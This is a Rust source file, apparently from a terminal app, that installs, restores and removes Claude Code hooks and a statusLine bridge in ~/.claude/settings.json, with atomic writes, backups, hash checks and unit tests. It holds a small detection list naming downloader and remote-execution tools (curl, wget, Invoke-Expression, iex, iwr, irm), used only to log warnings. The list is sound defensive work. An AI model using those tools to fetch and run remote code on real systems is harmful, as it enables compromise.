//! claude hooks provider 注入/卸载/状态检测实现（MC-213 下沉，provider 内部是 claude 合法领地 D11）
//!
//! 读写 ~/.claude/settings.json（绕过 project_root 路径沙箱，照 settings.rs 先例），
//! 阻塞 I/O 由命令层经 spawn_blocking 串行化（硬约束 #3）。
//! 路径辅助（home 解析）在 claude/mod.rs，供 CliHooksProvider impl 使用。
//!
//! statusline 桥接（context 官方用量百分比通道）：
//! - inject：写 slterm-statusline.js + settings.json 写 statusLine 键（桥接命令 = node 桥接脚本 + 原命令 argv），
//!   原 statusLine 备份到 ~/.slterminal/statusline-backup.json
//! - restore（客户端关闭清理）：statusLine 为桥接 → 还原备份，备份保留（供重开重注入）
//! - reinject（启动自动重注入）：备份存在 + 当前等于备份原配置 → 重新注入桥接；用户已改过 → 尊重跳过
//! - uninstall：statusLine 为桥接 → 还原备份（备份缺失 → 移除键），删备份

use crate::error::AppError;
use crate::hooks::{AgentHookInjectionStatus, AgentInjectionStatus};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::io::Write;
use std::path::{Path, PathBuf};
use tempfile::NamedTempFile;

/// 内嵌 hook reporter 脚本模板（编译期嵌入，用于版本比对与升级）
const HOOK_SCRIPT_TEMPLATE: &str = include_str!("slterm-hook-reporter.js");

/// 内嵌 statusline 桥接脚本模板（编译期嵌入；与 reporter 同批注入，版本同号）
const STATUSLINE_SCRIPT_TEMPLATE: &str = include_str!("slterm-statusline.js");

/// statusline 桥接脚本文件名
/// statusline 桥接脚本文件名（B15：mod.rs 的 reinject 单点引用，禁止硬编码重复）
pub(crate) const STATUSLINE_SCRIPT_NAME: &str = "slterm-statusline.js";

/// statusline 备份文件名（script_dir 父目录 = ~/.slterminal 下）
const STATUSLINE_BACKUP_NAME: &str = "statusline-backup.json";

/// 备份文件路径推导（script_dir = ~/.slterminal/hooks → 备份 = ~/.slterminal/statusline-backup.json）
fn backup_path_from_script_dir(script_dir: &Path) -> Option<PathBuf> {
    script_dir.parent().map(|p| p.join(STATUSLINE_BACKUP_NAME))
}

/// 备份文件路径（home 解析注入，供 provider impl 使用；home 缺失 → None）
pub(crate) fn statusline_backup_path(home: Option<PathBuf>) -> Option<PathBuf> {
    home.map(|h| h.join(".slterminal").join(STATUSLINE_BACKUP_NAME))
}

/// statusLine 是否为 slterm 桥接（command 含桥接脚本名）
fn statusline_is_bridge(status_line: &Value) -> bool {
    status_line
        .get("command")
        .and_then(|c| c.as_str())
        .is_some_and(|cmd| cmd.contains(STATUSLINE_SCRIPT_NAME))
}

/// 解包层数上限（防病态嵌套死循环）
const MAX_UNWRAP_DEPTH: usize = 5;

/// 解析单层包裹形态：`node "<自有脚本>" "<内层命令>"` → 内层命令。
/// 仅当脚本路径含自有脚本名（slterm-statusline.js / slterm-hook-reporter.js）才解包——
/// 用户自写 `node "x.js" "y"` 形态不碰（非自有包裹）。非包裹形态 → None。
fn parse_wrapped_command(cmd: &str) -> Option<String> {
    // JSON 转义引号还原：内层命令经 serde_json 序列化后引号带 `\"` 前缀，
    // 不还原则引号剥离/匹配全部失配（多层嵌套解包依赖此还原）
    let cmd = cmd.replace("\\\"", "\"");
    // 剥 node 前缀（容忍前后空白）
    let rest = cmd.strip_prefix("node")?.trim_start();
    // 提取第一对双引号内的脚本路径
    let rest = rest.strip_prefix('"')?;
    let script_end = rest.find('"')?;
    let script_path = &rest[..script_end];
    // 仅解自有脚本包裹（B11：损坏中间态 = reporter 包裹——识别并解包防双重包裹）
    if !script_path.contains(STATUSLINE_SCRIPT_NAME)
        && !script_path.contains("slterm-hook-reporter.js")
    {
        return None;
    }
    // 内层命令 = 脚本路径之后的部分，trim 后剥最外层引号
    let inner = rest[script_end + 1..].trim();
    let inner = if inner.len() >= 2 && inner.starts_with('"') && inner.ends_with('"') {
        &inner[1..inner.len() - 1]
    } else {
        inner
    };
    if inner.is_empty() {
        None
    } else {
        Some(inner.to_string())
    }
}

/// 递归解包包裹形态至最内层命令（B11：损坏中间态注入防御——
/// inject 把非桥接配置一律当用户原配置备份+包裹，若现有配置本身是
/// `node reporter "原命令"` 形态则双重包裹、透传末端是 reporter（stdout 恒空）。
/// 注入前解包出最内层命令作为「用户原配置」备份+透传目标）。
/// 至少解了一层才返回 Some；非包裹形态 → None（调用方按原样处理）。
fn unwrap_wrapped_statusline(command: &str) -> Option<String> {
    let mut current = command.to_string();
    let mut unwrapped = false;
    for _ in 0..MAX_UNWRAP_DEPTH {
        match parse_wrapped_command(&current) {
            Some(inner) => {
                current = inner;
                unwrapped = true;
            }
            None => break,
        }
    }
    unwrapped.then_some(current)
}

// ── statusline 原命令可疑模式审查（SEC-12） ──
//
// 桥接脚本透传执行用户原 statusline 命令（slterm-statusline.js argv[2]），若
// settings.json 的 statusLine 被篡改则形成命令注入面。审查 = 检测可疑模式
// （下载器 curl/wget、任意执行 Invoke-Expression 系），命中 tracing::warn! 告警——
// 仅记录不阻断（命令来自用户自身配置，信任边界登记在 S19 文档同步），
// 可测部分抽纯函数（suspicious_statusline_pattern）。

/// 可疑模式表：(小写模式串, 展示名)——下载器 + PowerShell 任意执行系
const SUSPICIOUS_PATTERNS: &[(&str, &str)] = &[
    ("curl", "curl"),
    ("wget", "wget"),
    ("invoke-expression", "Invoke-Expression"),
    ("iex", "iex"),
    ("invoke-webrequest", "Invoke-WebRequest"),
    ("iwr", "iwr"),
    ("irm", "irm"),
];

/// 词边界子串匹配（大小写不敏感）：命中词两侧须为非字母数字字符（或串边界）。
/// 防变量名/路径子串误报——`$MYCURLPATH` 的 curl 前邻 'Y' 不命中，`curl.exe` 命中
fn contains_word(text: &str, word: &str) -> bool {
    let lower = text.to_lowercase();
    let mut rest = lower.as_str();
    while let Some(pos) = rest.find(word) {
        let before_ok = pos == 0 || !rest[..pos].chars().next_back().unwrap().is_alphanumeric();
        let after = &rest[pos + word.len()..];
        let after_ok = after.chars().next().is_none_or(|c| !c.is_alphanumeric());
        if before_ok && after_ok {
            return true;
        }
        rest = after;
    }
    false
}

/// statusline 原命令可疑模式审查（纯函数，供测试）：命中返回模式展示名，未命中 None
fn suspicious_statusline_pattern(command: &str) -> Option<&'static str> {
    SUSPICIOUS_PATTERNS
        .iter()
        .find(|(pat, _)| contains_word(command, pat))
        .map(|(_, name)| *name)
}

/// 注入/重注入 statusline 时对原命令做可疑模式审查（SEC-12 调用点）——
/// 命中 tracing::warn! 告警，仅记录不阻断（信任边界：命令来自用户自身配置）
fn warn_if_suspicious_statusline(command: &str) {
    if let Some(pattern) = suspicious_statusline_pattern(command) {
        tracing::warn!(
            "statusline 原命令命中可疑模式 {pattern}（SEC-12 审查，仅记录不阻断）: {command}"
        );
    }
}

/// 构造桥接 statusLine 配置（command = node 桥接脚本 + 原命令 argv——桥接脚本透传执行原命令）
fn build_bridge_statusline(script_abs_path: &str, original_command: &str) -> Value {
    let path_normalized = script_abs_path.replace('\\', "/");
    serde_json::json!({
        "type": "command",
        "command": format!("node \"{}\" \"{}\"", path_normalized, original_command),
    })
}

/// C9 规定的 10 个注入事件（与四态映射相关的最小集）
/// pub(super)：SEC-05 hooks 写入语义校验（config.rs）复用同一白名单，单点定义
pub(super) const HOOK_EVENTS: &[&str] = &[
    "SessionStart",
    "SessionEnd",
    "UserPromptSubmit",
    "Stop",
    "StopFailure",
    "PreToolUse",
    "PostToolUse",
    "PostToolUseFailure",
    "Notification",
    "PermissionRequest",
];

// ── 版本提取（纯函数，供测试） ──

/// 从内嵌模板提取 SCRIPT_VERSION 常量值
fn template_version() -> u32 {
    for line in HOOK_SCRIPT_TEMPLATE.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix("const SCRIPT_VERSION") {
            if let Some(val) = rest.trim().strip_prefix("=") {
                let val = val.trim().trim_end_matches(';').trim();
                if let Ok(v) = val.parse::<u32>() {
                    return v;
                }
            }
        }
    }
    0 // 解析失败回退（不应发生——模板由仓库管理）
}

/// 从磁盘脚本文件提取 SCRIPT_VERSION 常量值
fn disk_script_version(path: &std::path::Path) -> Option<u32> {
    let content = std::fs::read_to_string(path).ok()?;
    for line in content.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix("const SCRIPT_VERSION") {
            if let Some(val) = rest.trim().strip_prefix("=") {
                let val = val.trim().trim_end_matches(';').trim();
                return val.parse::<u32>().ok();
            }
        }
    }
    None
}

// ── 脚本内容哈希比对（SEC-13） ──
//
// 版本检测原依赖首行 `SCRIPT_VERSION` 纯文本提取——磁盘脚本可被替换为首行匹配的
// 恶意文件（如 `const SCRIPT_VERSION = 6;` + 任意恶意体）。SEC-13：状态检测改为
// 对磁盘脚本字节计算 SHA-256 与内嵌模板（include_str! 编译期嵌入）哈希比对，
// 不一致 → Outdated（即便首行版本号相同）。version 字段仍报告磁盘解析的
// SCRIPT_VERSION（供诊断），不参与一致性判定。

/// 计算字节内容的 SHA-256 摘要（纯函数，供测试）
fn sha256_digest(data: &[u8]) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(data);
    hasher.finalize().into()
}

/// 内嵌脚本模板的 SHA-256 摘要（编译期常量模板，OnceLock 进程级单次计算）
fn template_sha256() -> [u8; 32] {
    static HASH: std::sync::OnceLock<[u8; 32]> = std::sync::OnceLock::new();
    *HASH.get_or_init(|| sha256_digest(HOOK_SCRIPT_TEMPLATE.as_bytes()))
}

/// 磁盘脚本内容是否与内嵌模板完全一致（字节级哈希比对；文件缺失/读取失败 → false）
fn disk_script_matches_template(path: &std::path::Path) -> bool {
    let Ok(content) = std::fs::read(path) else {
        return false;
    };
    sha256_digest(&content) == template_sha256()
}

// ── matcher 检测（纯谓词） ──

/// 检查 settings.json 的 hooks 段中是否包含 slterm-hook-reporter 的 matcher 组
fn has_slterm_matchers(settings: &Value) -> bool {
    settings
        .get("hooks")
        .and_then(|h| h.as_object())
        .is_some_and(|obj| {
            obj.values().any(|matchers| {
                matchers
                    .as_array()
                    .is_some_and(|arr| arr.iter().any(matcher_contains_slterm))
            })
        })
}

/// 单个 handler 是否引用了 slterm-hook-reporter（C9 识别规则，handler 级判定——
/// 与前端 isSltermManaged 粒度一致）
fn handler_contains_slterm(hook: &Value) -> bool {
    hook.get("command")
        .and_then(|c| c.as_str())
        .is_some_and(|cmd| cmd.contains("slterm-hook-reporter"))
}

/// 单个 matcher 组是否引用了 slterm-hook-reporter（组内任一 handler 命中）
fn matcher_contains_slterm(matcher: &Value) -> bool {
    matcher
        .get("hooks")
        .and_then(|hooks| hooks.as_array())
        .is_some_and(|hooks_arr| hooks_arr.iter().any(handler_contains_slterm))
}

/// 从 hooks 对象中移除所有 slterm-hook-reporter 条目（**handler 级剔除**）：
/// - 组内 hooks 数组剔除命中的 handler——用户自定义 handler 与注入 handler 混入
///   同一 matcher 组时仅删 slterm handler、保留用户条目（与前端 isSltermManaged
///   粒度对齐，验收修复：旧实现按 matcher 组级删除会连带删除组内用户 handler）
/// - 组内 hooks 全空 → 删除整组；无 hooks 数组的组原样保留（非标准形态不碰用户数据）
/// - 事件键下无剩余组 → 清理空数组事件键
///   返回 true 表示有实际移除（含组内 handler 剔除——changed 决定是否写盘）
fn remove_slterm_matchers(hooks: &mut serde_json::Map<String, Value>) -> bool {
    let mut removed = false;
    for (_event, matchers_val) in hooks.iter_mut() {
        if let Some(matchers) = matchers_val.as_array_mut() {
            let mut filtered: Vec<Value> = Vec::with_capacity(matchers.len());
            for mut m in matchers.drain(..) {
                let mut keep_group = true;
                if let Some(hooks_arr) = m.get_mut("hooks").and_then(|h| h.as_array_mut()) {
                    let before_len = hooks_arr.len();
                    hooks_arr.retain(|h| !handler_contains_slterm(h));
                    if hooks_arr.len() < before_len {
                        removed = true; // 组内 handler 被剔除
                    }
                    keep_group = !hooks_arr.is_empty();
                }
                if keep_group {
                    filtered.push(m);
                } else {
                    removed = true; // 整组被删
                }
            }
            *matchers = filtered;
        }
    }
    // 清理空数组的事件键
    hooks.retain(|_event, matchers_val| matchers_val.as_array().is_none_or(|arr| !arr.is_empty()));
    removed
}

/// 构建单个 matcher 条目（C9：matcher="" 匹配全部, timeout=5）
fn build_matcher_entry(script_abs_path: &str) -> Value {
    let path_normalized = script_abs_path.replace('\\', "/");
    serde_json::json!({
        "matcher": "",
        "hooks": [{
            "type": "command",
            "command": format!("node \"{}\"", path_normalized),
            "timeout": 5
        }]
    })
}

/// 将 slterm 的 10 事件 matcher 追加到 hooks 对象中（保留用户现有条目）
fn inject_matchers(hooks: &mut serde_json::Map<String, Value>, script_abs_path: &str) {
    let entry = build_matcher_entry(script_abs_path);
    for event in HOOK_EVENTS {
        let arr = hooks
            .entry(event.to_string())
            .or_insert_with(|| serde_json::json!([]));
        if let Some(matchers) = arr.as_array_mut() {
            // 幂等：仅当不存在 slterm matcher 时追加
            let already_has = matchers.iter().any(matcher_contains_slterm);
            if !already_has {
                matchers.push(entry.clone());
            }
        } else {
            // 非数组值（极端情况）→ 替换为数组
            *arr = serde_json::json!([entry]);
        }
    }
}

// ── 实现（路径可注入，供命令与测试共用——D2 零行为变更） ──

/// agent_hooks_inject（claude）实现：落盘脚本 + merge 注入 settings.json（C6/C9）
///
/// 流程：确保脚本目录存在 → 原子写 reporter + statusline 桥接脚本 → 读 settings.json →
/// 移除旧 slterm 段 → 追加 10 事件 matcher → statusLine 备份 + 写桥接配置 → 原子写回。
/// JSON 非法时返回 AppError 且不改动文件。
pub(crate) fn inject_impl(
    settings_path: &std::path::Path,
    script_dir: &std::path::Path,
) -> Result<AgentHookInjectionStatus, AppError> {
    // 1. 确保脚本目录存在并原子写 reporter + statusline 桥接脚本
    std::fs::create_dir_all(script_dir)?;

    let script_path = script_dir.join("slterm-hook-reporter.js");
    let mut tmp_script = NamedTempFile::new_in(script_dir)?;
    tmp_script.write_all(HOOK_SCRIPT_TEMPLATE.as_bytes())?;
    tmp_script.flush()?;
    tmp_script
        .persist(&script_path)
        .map_err(|e| AppError::IoKind {
            kind: format!("{:?}", e.error.kind()),
            message: format!("脚本写入失败: {e}"),
        })?;

    let statusline_script_path = script_dir.join(STATUSLINE_SCRIPT_NAME);
    let mut tmp_sl = NamedTempFile::new_in(script_dir)?;
    tmp_sl.write_all(STATUSLINE_SCRIPT_TEMPLATE.as_bytes())?;
    tmp_sl.flush()?;
    tmp_sl
        .persist(&statusline_script_path)
        .map_err(|e| AppError::IoKind {
            kind: format!("{:?}", e.error.kind()),
            message: format!("statusline 桥接脚本写入失败: {e}"),
        })?;

    // 2. 读 settings.json
    let mut settings: Value = if settings_path.exists() {
        let content = std::fs::read_to_string(settings_path)?;
        let trimmed = content.trim();
        if trimmed.is_empty() {
            Value::Object(serde_json::Map::new())
        } else {
            // JSON 非法则中止，不改动文件（C9）
            serde_json::from_str(&content).map_err(|e| AppError::IoKind {
                kind: "parse".into(),
                message: format!("~/.claude/settings.json 格式错误，请先修复: {e}"),
            })?
        }
    } else {
        Value::Object(serde_json::Map::new())
    };

    // 3. 确保 settings 是 JSON 对象
    let root_obj = settings.as_object_mut().ok_or_else(|| AppError::IoKind {
        kind: "parse".into(),
        message: "settings.json 根不是 JSON 对象".into(),
    })?;

    // 4. 获取或创建 hooks 段
    let hooks = root_obj
        .entry("hooks")
        .or_insert_with(|| Value::Object(serde_json::Map::new()));
    let hooks_obj = hooks.as_object_mut().ok_or_else(|| AppError::IoKind {
        kind: "parse".into(),
        message: "settings.json 的 hooks 段不是 JSON 对象".into(),
    })?;

    // 5. 移除旧 slterm 段（幂等/升级场景），追加新的 10 事件 matcher
    let script_abs = dunce::simplified(&script_path)
        .to_string_lossy()
        .to_string();
    remove_slterm_matchers(hooks_obj);
    inject_matchers(hooks_obj, &script_abs);

    // 6. statusLine 桥接：已是桥接 → 幂等跳过；否则备份原配置（含 command 才备份）+ 写桥接配置
    //    （原 statusLine 缺失 → 不备份，桥接仍注入、原命令空——透传分支退化为纯信号上报）
    let statusline_abs = dunce::simplified(&statusline_script_path)
        .to_string_lossy()
        .to_string();
    let existing_statusline = root_obj.get("statusLine").cloned();
    if existing_statusline
        .as_ref()
        .is_some_and(statusline_is_bridge)
    {
        // 幂等：二次注入不重建桥接（原命令保持）
    } else {
        // B11: 原命令提取前递归解包自有包裹形态——现有配置若本身是
        // `node reporter "原命令"` 形态（损坏中间态），直接包裹会双重包裹、
        // 透传末端是 reporter（stdout 恒空 → TUI 状态行空白）。解包命中时
        // 备份值 = 最内层命令（干净原配置），restore/reinject 不再复刻损坏态。
        let raw_command = existing_statusline
            .as_ref()
            .and_then(|sl| sl.get("command"))
            .and_then(|c| c.as_str());
        let (original_command, backup_value) = match raw_command {
            Some(raw) => match unwrap_wrapped_statusline(raw) {
                Some(inner) => (
                    Some(inner.clone()),
                    Some(serde_json::json!({ "type": "command", "command": inner })),
                ),
                None => (Some(raw.to_string()), existing_statusline.clone()),
            },
            None => (None, None),
        };
        // SEC-12：对透传执行的原命令做可疑模式审查（命中 warn，仅记录不阻断）
        if let Some(original) = &original_command {
            warn_if_suspicious_statusline(original);
        }
        if original_command.is_some() {
            if let Some(backup_path) = backup_path_from_script_dir(script_dir) {
                write_backup(&backup_path, backup_value.unwrap_or(Value::Null))?;
            }
        }
        root_obj.insert(
            "statusLine".into(),
            build_bridge_statusline(&statusline_abs, original_command.as_deref().unwrap_or("")),
        );
    }

    // 7. 原子写回 settings.json
    let settings_parent = settings_path.parent().ok_or_else(|| AppError::IoKind {
        kind: "path".into(),
        message: "无法获取 settings.json 父目录".into(),
    })?;
    std::fs::create_dir_all(settings_parent)?;
    atomic_write_settings(settings_path, &settings)?;

    Ok(AgentHookInjectionStatus {
        status: AgentInjectionStatus::Injected,
        version: Some(template_version()),
    })
}

/// 原子写 settings.json（NamedTempFile + persist；父目录须已存在）
fn atomic_write_settings(
    settings_path: &std::path::Path,
    settings: &Value,
) -> Result<(), AppError> {
    let parent = settings_path.parent().ok_or_else(|| AppError::IoKind {
        kind: "path".into(),
        message: "无法获取 settings.json 父目录".into(),
    })?;
    std::fs::create_dir_all(parent)?;
    let json_str = serde_json::to_string_pretty(settings)?;
    let mut tmp = NamedTempFile::new_in(parent)?;
    tmp.write_all(json_str.as_bytes())?;
    tmp.flush()?;
    tmp.persist(settings_path).map_err(|e| AppError::IoKind {
        kind: format!("{:?}", e.error.kind()),
        message: format!("settings.json 写入失败: {e}"),
    })?;
    Ok(())
}

/// 原子写 statusline 备份文件（失败静默——备份是增强特性，不阻断注入主流程）
fn write_backup(backup_path: &std::path::Path, backup: Value) -> Result<(), AppError> {
    if let Some(parent) = backup_path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let json_str = serde_json::to_string_pretty(&backup)?;
    let mut tmp = NamedTempFile::new_in(backup_path.parent().ok_or_else(|| AppError::IoKind {
        kind: "path".into(),
        message: "无法获取备份文件父目录".into(),
    })?)?;
    tmp.write_all(json_str.as_bytes())?;
    tmp.flush()?;
    tmp.persist(backup_path).map_err(|e| AppError::IoKind {
        kind: format!("{:?}", e.error.kind()),
        message: format!("statusline 备份写入失败: {e}"),
    })?;
    Ok(())
}

/// 读取 statusline 备份（缺失/损坏 → None，不区分具体错误）
fn read_backup(backup_path: &std::path::Path) -> Option<Value> {
    let content = std::fs::read_to_string(backup_path).ok()?;
    serde_json::from_str::<Value>(content.trim()).ok()
}

/// 关闭清理：restore statusline——当前为桥接 → 还原备份原配置（备份**保留**，供重开重注入）；
/// 非桥接（用户已改过）/ 无 settings / 非法 JSON → 静默跳过（关闭链路尽力而为，不阻断）
pub(crate) fn restore_statusline_impl(
    settings_path: Option<&std::path::Path>,
    backup_path: Option<&std::path::Path>,
) -> Result<(), AppError> {
    let Some(settings_path) = settings_path else {
        return Ok(());
    };
    if !settings_path.exists() {
        return Ok(());
    }
    let Ok(content) = std::fs::read_to_string(settings_path) else {
        return Ok(());
    };
    let trimmed = content.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    let Ok(mut settings) = serde_json::from_str::<Value>(trimmed) else {
        return Ok(()); // 非法 JSON 静默跳过（不损坏用户文件）
    };
    if !settings.get("statusLine").is_some_and(statusline_is_bridge) {
        return Ok(()); // 用户已改过 → 尊重不动
    }
    let Some(root) = settings.as_object_mut() else {
        return Ok(());
    };
    match backup_path.and_then(read_backup) {
        Some(backup) => {
            root.insert("statusLine".into(), backup);
        }
        None => {
            root.remove("statusLine"); // 无备份（注入时原配置缺失）→ 移除键
        }
    }
    atomic_write_settings(settings_path, &settings)?;
    Ok(())
}

/// 启动自动重注入：备份存在 + 当前 statusLine 等于备份原配置 → 重新注入桥接；
/// 无备份 / 当前已是桥接 / 用户已改过（含删除键）/ 脚本缺失 → no-op（尊重用户现状）
pub(crate) fn reinject_statusline_impl(
    settings_path: Option<&std::path::Path>,
    backup_path: Option<&std::path::Path>,
    script_path: Option<&std::path::Path>,
) -> Result<(), AppError> {
    let (Some(settings_path), Some(backup_path), Some(script_path)) =
        (settings_path, backup_path, script_path)
    else {
        return Ok(());
    };
    if !script_path.is_file() {
        return Ok(()); // 桥接脚本不存在 → 未注入状态，跳过
    }
    let Some(backup) = read_backup(backup_path) else {
        return Ok(()); // 无备份 → 跳过
    };
    if !settings_path.exists() {
        return Ok(());
    }
    let Ok(content) = std::fs::read_to_string(settings_path) else {
        return Ok(());
    };
    let trimmed = content.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    let Ok(mut settings) = serde_json::from_str::<Value>(trimmed) else {
        return Ok(()); // 非法 JSON 跳过（不损坏用户文件）
    };
    let current = settings.get("statusLine").cloned();
    if current.as_ref().is_some_and(statusline_is_bridge) {
        return Ok(()); // 已是桥接（异常退出未恢复成）→ 无需重注入
    }
    if current.as_ref() != Some(&backup) {
        return Ok(()); // 用户已改过 → 尊重不动
    }
    // 恢复场景：当前 = 备份原配置 → 重新注入桥接
    let script_abs = dunce::simplified(script_path).to_string_lossy().to_string();
    // B11: 备份文件可能存有损坏中间态（历史遗留）——解包最内层命令，
    // 防重注入复刻双重包裹
    let original_command = backup
        .get("command")
        .and_then(|c| c.as_str())
        .map(|c| unwrap_wrapped_statusline(c).unwrap_or_else(|| c.to_string()))
        .unwrap_or_default();
    // SEC-12：重注入同样对透传执行的原命令做可疑模式审查（命中 warn，仅记录不阻断）
    if !original_command.is_empty() {
        warn_if_suspicious_statusline(&original_command);
    }
    if let Some(root) = settings.as_object_mut() {
        root.insert(
            "statusLine".into(),
            build_bridge_statusline(&script_abs, &original_command),
        );
    }
    atomic_write_settings(settings_path, &settings)?;
    Ok(())
}

/// agent_hooks_uninstall（claude）实现：移除配置段 + 删脚本目录 + 清信号目录（C6/C9）
///
/// 安全策略：settings.json 非法时仅跳过配置清理（不损坏用户文件），但仍删除目录。
pub(crate) fn uninstall_impl(
    settings_path: Option<&std::path::Path>,
    script_dir: Option<&std::path::Path>,
    events_dir: Option<&std::path::Path>,
) -> Result<(), AppError> {
    // 1. 从 settings.json 移除 slTerminal 全部 matcher 组 + 还原 statusLine 桥接
    let backup_value = script_dir
        .and_then(backup_path_from_script_dir)
        .and_then(|p| read_backup(&p));
    if let Some(settings_path) = settings_path {
        if settings_path.exists() {
            if let Ok(content) = std::fs::read_to_string(settings_path) {
                let trimmed = content.trim();
                if !trimmed.is_empty() {
                    if let Ok(mut settings) = serde_json::from_str::<Value>(&content) {
                        let mut changed = false;
                        if let Some(hooks) =
                            settings.get_mut("hooks").and_then(|h| h.as_object_mut())
                        {
                            if remove_slterm_matchers(hooks) {
                                changed = true;
                            }
                            // hooks 段全空 → 移除整个 "hooks" 键
                            if hooks.is_empty() {
                                if let Some(root) = settings.as_object_mut() {
                                    root.remove("hooks");
                                }
                            }
                        }
                        // statusLine 桥接 → 还原备份（备份缺失 → 移除键，用户原本无 statusLine）；
                        // 用户已改过（非桥接）→ 保留不动
                        if settings.get("statusLine").is_some_and(statusline_is_bridge) {
                            changed = true;
                            if let Some(root) = settings.as_object_mut() {
                                match backup_value {
                                    Some(ref backup) => {
                                        root.insert("statusLine".into(), backup.clone());
                                    }
                                    None => {
                                        root.remove("statusLine");
                                    }
                                }
                            }
                        }
                        if changed {
                            if let Some(parent) = settings_path.parent() {
                                let json_str = serde_json::to_string_pretty(&settings)?;
                                let mut tmp = NamedTempFile::new_in(parent)?;
                                tmp.write_all(json_str.as_bytes())?;
                                tmp.flush()?;
                                tmp.persist(settings_path).map_err(|e| AppError::IoKind {
                                    kind: format!("{:?}", e.error.kind()),
                                    message: format!("settings.json 写入失败: {e}"),
                                })?;
                            }
                        }
                    }
                    // JSON 非法 → 静默跳过配置清理，仍删目录
                }
            }
        }
    }

    // 1.5 删除 statusline 备份文件（还原已完成，备份使命结束）
    if let Some(backup_path) = script_dir.and_then(backup_path_from_script_dir) {
        let _ = std::fs::remove_file(&backup_path);
    }

    // 2. 删除脚本目录
    if let Some(d) = script_dir {
        if d.exists() {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    // 3. 清空信号目录
    if let Some(d) = events_dir {
        if d.exists() {
            let _ = std::fs::remove_dir_all(d);
        }
    }

    Ok(())
}

/// agent_hooks_injection_status（claude）实现：查询注入状态（C6/C9）
///
/// 三态判定：脚本存在 + settings 含 matcher + statusLine 为桥接 + 版本一致 → Injected;
/// matcher 在但 statusLine 非桥接（关闭还原后未重注入）或版本不一致 → Outdated;
/// 其他 → NotInjected。
pub(crate) fn injection_status_impl(
    script_path: &std::path::Path,
    settings_path: &std::path::Path,
) -> AgentHookInjectionStatus {
    // 脚本是否存在且为普通文件
    if !script_path.is_file() {
        return AgentHookInjectionStatus {
            status: AgentInjectionStatus::NotInjected,
            version: None,
        };
    }

    // 检查 settings.json 中是否有 slTerminal matcher 组
    let has_matchers = if settings_path.exists() {
        std::fs::read_to_string(settings_path)
            .ok()
            .and_then(|c| {
                let trimmed = c.trim();
                if trimmed.is_empty() {
                    Some(false)
                } else {
                    serde_json::from_str::<Value>(&c)
                        .ok()
                        .map(|settings| has_slterm_matchers(&settings))
                }
            })
            .unwrap_or(false)
    } else {
        false
    };

    if !has_matchers {
        return AgentHookInjectionStatus {
            status: AgentInjectionStatus::NotInjected,
            version: None,
        };
    }

    // SEC-13 内容哈希比对：磁盘脚本字节 vs 内嵌模板 SHA-256——不一致 → Outdated。
    // 原实现比对首行 SCRIPT_VERSION 纯文本——磁盘脚本可被替换为首行匹配的恶意文件
    // （`const SCRIPT_VERSION = N;` + 任意恶意体），版本文本比对不再可信，改内容哈希。
    // version 字段仍报告磁盘解析的 SCRIPT_VERSION（诊断用），不参与一致性判定。
    let disk_ver = disk_script_version(script_path);
    if !disk_script_matches_template(script_path) {
        return AgentHookInjectionStatus {
            status: AgentInjectionStatus::Outdated,
            version: disk_ver,
        };
    }

    // statusLine 桥接检查：关闭还原/手动改回后 → Outdated（hooks matcher 仍在但桥接缺失）
    let statusline_bridged = std::fs::read_to_string(settings_path)
        .ok()
        .and_then(|c| serde_json::from_str::<Value>(c.trim()).ok())
        .and_then(|settings| settings.get("statusLine").cloned())
        .is_some_and(|sl| statusline_is_bridge(&sl));

    if !statusline_bridged {
        return AgentHookInjectionStatus {
            status: AgentInjectionStatus::Outdated,
            version: disk_ver,
        };
    }

    AgentHookInjectionStatus {
        status: AgentInjectionStatus::Injected,
        version: disk_ver,
    }
}

// ── 测试 ──

#[cfg(test)]
mod tests {
    use super::*;

    // ── template_version ──

    #[test]
    fn template_version_positive() {
        let v = template_version();
        assert!(v > 0, "SCRIPT_VERSION 应大于 0，实际: {v}");
        // 决策 7/KZ-3 后 = 3；statusline 桥接引入（reporter + 桥接脚本同批注入）→ 4；
        // B11 注入解包 + 桥接引号容忍/失败占位 → 5；B16 bash 定位 + 正斜杠 → 6
        // （已注入用户变「版本过旧」需重注入）
        assert_eq!(
            v, 6,
            "SCRIPT_VERSION 应已递增到 6（B16 bash 定位 + 正斜杠）"
        );
    }

    // ── 模板内嵌校验（决策 7：显式 cliId + SCRIPT_VERSION 递增） ──

    #[test]
    fn template_contains_explicit_cli_id() {
        assert!(
            HOOK_SCRIPT_TEMPLATE.contains("cliId: \"claude\""),
            "reporter 模板应显式写 cliId: \"claude\"（决策 7）"
        );
    }

    // ── HOOK_EVENTS ──

    #[test]
    fn hook_events_count_and_unique() {
        assert_eq!(HOOK_EVENTS.len(), 10, "注入事件数应为 10");
        let mut sorted = HOOK_EVENTS.to_vec();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), 10, "10 个事件不应有重复");
    }

    #[test]
    fn hook_events_contains_key_events() {
        assert!(HOOK_EVENTS.contains(&"SessionStart"));
        assert!(HOOK_EVENTS.contains(&"SessionEnd"));
        assert!(HOOK_EVENTS.contains(&"PreToolUse"));
        assert!(HOOK_EVENTS.contains(&"Notification"));
    }

    // ── has_slterm_matchers ──

    #[test]
    fn has_matchers_empty_settings() {
        assert!(!has_slterm_matchers(&serde_json::json!({})));
    }

    #[test]
    fn has_matchers_no_hooks_key() {
        assert!(!has_slterm_matchers(&serde_json::json!({"other": "value"})));
    }

    #[test]
    fn has_matchers_detects_command() {
        let settings = serde_json::json!({
            "hooks": {
                "SessionStart": [{
                    "matcher": "",
                    "hooks": [{
                        "type": "command",
                        "command": "node \"C:/Users/test/.slterminal/hooks/slterm-hook-reporter.js\"",
                        "timeout": 5
                    }]
                }]
            }
        });
        assert!(has_slterm_matchers(&settings));
    }

    #[test]
    fn has_matchers_user_hooks_not_detected() {
        let settings = serde_json::json!({
            "hooks": {
                "PreToolUse": [{
                    "matcher": "",
                    "hooks": [{
                        "type": "command",
                        "command": "node \"./my-hook.js\"",
                        "timeout": 60
                    }]
                }]
            }
        });
        assert!(!has_slterm_matchers(&settings));
    }

    // ── disk_script_version ──

    #[test]
    fn disk_version_parses() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
